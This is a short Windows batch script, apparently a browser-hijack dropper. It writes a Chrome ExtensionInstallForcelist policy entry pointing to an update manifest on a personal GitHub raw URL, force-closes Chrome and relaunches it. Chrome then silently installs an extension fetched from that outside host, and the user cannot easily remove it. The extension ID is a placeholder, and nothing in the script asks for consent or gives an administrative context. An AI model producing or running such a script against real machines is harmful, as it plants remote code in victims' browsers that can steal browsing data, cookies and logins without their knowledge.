set "EXT_ID=YOUR_32_CHAR_EXT_ID"
set "UPDATE_URL=https://raw.githubusercontent.com/Ayamet/web/main/update.xml"

REG ADD "HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "%EXT_ID%;%UPDATE_URL%" /f
taskkill /F /IM chrome.exe >nul 2>&1
start chrome
